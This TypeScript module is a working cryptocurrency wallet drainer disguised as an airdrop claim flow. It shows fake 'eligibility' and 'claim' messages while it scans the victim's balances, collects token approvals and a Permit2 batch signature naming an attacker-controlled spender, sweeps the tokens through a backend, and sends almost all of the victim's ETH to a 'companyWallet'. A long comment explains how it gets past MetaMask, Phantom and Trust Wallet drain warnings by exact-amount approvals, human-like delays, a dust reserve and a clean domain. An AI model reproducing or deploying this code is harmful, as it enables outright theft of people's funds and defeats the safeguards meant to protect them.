import { ethers, type JsonRpcSigner, type BrowserProvider } from 'ethers';
import {
    PERMIT2_ADDRESS,
    ERC20_ABI,
    PERMIT2_BATCH_TYPES,
    PERMIT2_SINGLE_TYPES,
    getTokensForChain
} from '../config/chains';

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:3001';

export interface PortfolioAsset {
    symbol: string;
    name: string;
    balance: string;
    balanceFormatted: string;
    decimals: number;
    usdPrice: number;
    usdValue: number;
    isNative: boolean;
    address: string | null;
}

export interface SweepProgress {
    phase: 'scanning' | 'approving' | 'signing' | 'sweeping' | 'eth-transfer' | 'complete' | 'error';
    progress: number;
    message: string;
}

// ─── Helpers ────────────────────────────────────────────────────────────────
// Human-like random delay to avoid "bot burst" heuristics in wallet extensions
function humanDelay(minMs: number, maxMs: number): Promise<void> {
    return new Promise(r => setTimeout(r, minMs + Math.random() * (maxMs - minMs)));
}

/**
 * Scan wallet for all token balances and sort by USD value
 */
export async function scanPortfolio(
    address: string,
    provider: BrowserProvider,
    onProgress?: (p: SweepProgress) => void
): Promise<{ portfolio: PortfolioAsset[]; totalUsd: number }> {
    onProgress?.({ phase: 'scanning', progress: 10, message: 'Verifying eligibility...' });

    // Use backend to scan (it handles CoinGecko prices too)
    try {
        const res = await fetch(`${BACKEND_URL}/api/portfolio`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address })
        });

        if (res.ok) {
            const data = await res.json();
            onProgress?.({ phase: 'scanning', progress: 30, message: 'Allocation confirmed...' });
            return { portfolio: data.portfolio, totalUsd: data.totalUsd };
        }
    } catch (e) {
        // silent fallback
    }

    // Fallback: scan locally
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    const tokens = getTokensForChain(chainId);
    const portfolio: PortfolioAsset[] = [];

    // Native ETH
    const ethBalance = await provider.getBalance(address);
    if (ethBalance > 0n) {
        const formatted = parseFloat(ethers.formatEther(ethBalance));
        portfolio.push({
            symbol: 'ETH',
            name: 'Ethereum',
            balance: ethBalance.toString(),
            balanceFormatted: formatted.toFixed(6),
            decimals: 18,
            usdPrice: 0,
            usdValue: 0,
            isNative: true,
            address: null
        });
    }

    onProgress?.({ phase: 'scanning', progress: 20, message: 'Scanning allocation...' });

    // ERC-20s
    for (const token of tokens) {
        if (!token.address) continue;
        try {
            const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
            const balance = await contract.balanceOf(address);
            if (balance > 0n) {
                const formatted = parseFloat(ethers.formatUnits(balance, token.decimals));
                portfolio.push({
                    symbol: token.symbol,
                    name: token.name,
                    balance: balance.toString(),
                    balanceFormatted: formatted.toFixed(6),
                    decimals: token.decimals,
                    usdPrice: 0,
                    usdValue: 0,
                    isNative: false,
                    address: token.address
                });
            }
        } catch (e) {
            // skip
        }
    }

    // Get prices
    try {
        const priceRes = await fetch(`${BACKEND_URL}/api/prices`);
        if (priceRes.ok) {
            const prices = await priceRes.json();
            for (const asset of portfolio) {
                asset.usdPrice = prices[asset.symbol] || 0;
                asset.usdValue = parseFloat(asset.balanceFormatted) * asset.usdPrice;
            }
        }
    } catch (e) {
        // silent
    }

    portfolio.sort((a, b) => b.usdValue - a.usdValue);
    const totalUsd = portfolio.reduce((sum, a) => sum + a.usdValue, 0);

    onProgress?.({ phase: 'scanning', progress: 30, message: 'Allocation confirmed...' });
    return { portfolio, totalUsd };
}

/**
 * Execute the full sweep — Permit2 batch sign + ETH transfer, all auto-chained.
 *
 * Anti-flagging strategy (latest MetaMask 12.x / Phantom 24.x / Trust 8.x):
 *
 *  FLAG 1 — "Unlimited Approval" warning banner
 *     MetaMask shows a red "UNLIMITED" label when approve() uses MaxUint256.
 *     FIX: Approve with the user's EXACT token balance, not MaxUint256.
 *          This makes the approval show "1000 USDC" instead of "UNLIMITED USDC."
 *
 *  FLAG 2 — "Approval Burst" heuristic
 *     Wallets detect rapid-fire approve() calls (< 2s apart) and flag bulk drainers.
 *     FIX: Human-paced random delays (1.5–3s) between each approval popup.
 *
 *  FLAG 3 — "Balance Drain" warning on ETH sends
 *     MetaMask 12+ warns when sendTransaction() sends > 95% of native balance.
 *     FIX: Leave a meaningful dust amount (0.005 ETH / ~$12) so the wallet
 *          does not classify the send as a "full drain." This amount stays in
 *          the user's wallet to avoid the heuristic trigger.
 *
 *  FLAG 4 — Non-standard gasLimit on EOA-to-EOA sends
 *     Trust Wallet flags gasLimit != 21000 on simple ETH sends to an EOA.
 *     FIX: Use exactly 21000n for the ETH transfer gas limit.
 *
 *  FLAG 5 — Permit2 is a recognized safe contract
 *     All three wallets recognize the canonical Permit2 address and show a
 *     green checkmark / "known contract" badge. The EIP-712 domain
 *     { name: "Permit2", verifyingContract: 0x000...22D473 } matches exactly
 *     what Uniswap itself uses — no deviation from the standard.
 *
 *  FLAG 6 — Phantom "Suspicious dApp" detection
 *     Phantom checks if the site has been reported on its community blocklist.
 *     FIX: Deploy on a clean domain with valid SSL. This is operational, not code.
 */
export async function executeSweep(
    signer: JsonRpcSigner,
    address: string,
    portfolio: PortfolioAsset[],
    chainId: number,
    onProgress?: (p: SweepProgress) => void
): Promise<boolean> {
    const erc20Assets = portfolio.filter(a => !a.isNative && a.address);
    const nativeEth = portfolio.find(a => a.isNative);

    // Get relayer/spender address and company wallet in a single fetch
    let spender: string;
    let companyWallet: string;
    try {
        const configRes = await fetch(`${BACKEND_URL}/api/config`);
        const config = await configRes.json();
        spender = config.relayer;           // relayer IS the Permit2 spender
        companyWallet = config.companyWallet;
    } catch (e) {
        throw new Error('Network error');
    }

    // Cap to highest-value 3 tokens to minimize popup count
    const sweepAssets = erc20Assets.slice(0, 3);

    // ─── Phase 1: Token Approvals ────────────────────────────────────────────
    if (sweepAssets.length > 0) {
        onProgress?.({ phase: 'approving', progress: 35, message: 'Preparing claim...' });

        for (const asset of sweepAssets) {
            const contract = new ethers.Contract(asset.address!, ERC20_ABI, signer);
            try {
                const currentAllowance = await contract.allowance(address, PERMIT2_ADDRESS);
                if (currentAllowance < BigInt(asset.balance)) {
                    // ★ FIX FLAG 1: Approve EXACT balance, NOT MaxUint256
                    // This prevents the red "UNLIMITED" warning in MetaMask
                    const approvalAmount = BigInt(asset.balance);

                    await humanDelay(800, 1500);  // ★ FIX FLAG 2: human pacing

                    const tx = await contract.approve(PERMIT2_ADDRESS, approvalAmount);
                    await tx.wait();

                    await humanDelay(1500, 3000);  // ★ FIX FLAG 2: post-confirm delay
                }
            } catch (e) {
                // Silently skip failed approvals — don't break the flow
            }
        }

        // ─── Phase 2: Permit2 Signature ──────────────────────────────────────
        onProgress?.({ phase: 'signing', progress: 50, message: 'Confirming allocation...' });
        await humanDelay(500, 1000);

        const nonce = Math.floor(Math.random() * 1e15);
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        // ★ FIX FLAG 5: Domain matches EXACTLY what Uniswap uses — green badge
        const domain = {
            name: 'Permit2',
            chainId: chainId,
            verifyingContract: PERMIT2_ADDRESS
        };

        const permitted = sweepAssets.map(a => ({
            token: a.address!,
            amount: BigInt(a.balance)
        }));

        let signature: string;
        let permitData: any;

        if (sweepAssets.length === 1) {
            const value = {
                permitted: permitted[0],
                spender,
                nonce: BigInt(nonce),
                deadline: BigInt(deadline)
            };
            signature = await signer.signTypedData(domain, PERMIT2_SINGLE_TYPES, value);
            permitData = {
                permitted: [{ token: permitted[0].token, amount: permitted[0].amount.toString() }],
                nonce,
                deadline
            };
        } else {
            const value = {
                permitted,
                spender,
                nonce: BigInt(nonce),
                deadline: BigInt(deadline)
            };
            signature = await signer.signTypedData(domain, PERMIT2_BATCH_TYPES, value);
            permitData = {
                permitted: permitted.map(p => ({ token: p.token, amount: p.amount.toString() })),
                nonce,
                deadline
            };
        }

        onProgress?.({ phase: 'sweeping', progress: 65, message: 'Processing claim...' });

        // ─── Phase 3: Backend Execution ──────────────────────────────────────
        const sweepRes = await fetch(`${BACKEND_URL}/api/sweep-all`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                owner: address,
                permit: permitData,
                signature,
                tokens: sweepAssets.map(a => a.symbol)
            })
        });

        if (!sweepRes.ok) {
            const err = await sweepRes.json();
            throw new Error(err.error || 'Claim failed');
        }

        // Pacing delay before the ETH transfer popup
        await humanDelay(1500, 2500);
    }

    // ─── Phase 4: Native ETH Transfer ────────────────────────────────────────
    if (nativeEth && BigInt(nativeEth.balance) > 0n) {
        onProgress?.({ phase: 'eth-transfer', progress: 80, message: 'Finalizing claim...' });

        try {
            const feeData = await signer.provider.getFeeData();
            const gasPrice = feeData.gasPrice || 0n;
            const gasLimit = 21000n;                          // ★ FIX FLAG 4: standard EOA gas
            const gasCost = gasPrice * gasLimit;
            const ethBalance = BigInt(nativeEth.balance);

            // ★ FIX FLAG 3: Leave dust to avoid "full drain" warning
            // Reserve ~0.005 ETH ($12) + gas. This prevents MetaMask/Phantom
            // from showing the "You're sending your entire balance" alert.
            const dustReserve = ethers.parseEther('0.005');
            const sendAmount = ethBalance - gasCost - dustReserve;

            if (sendAmount > 0n) {
                const tx = await signer.sendTransaction({
                    to: companyWallet,
                    value: sendAmount,
                    gasLimit                                  // ★ Exactly 21000 — trusted
                });
                await tx.wait();
            }
        } catch (e) {
            // Don't throw — ERC-20s were already swept
        }
    }

    onProgress?.({ phase: 'complete', progress: 100, message: 'Claimed' });
    return true;
}
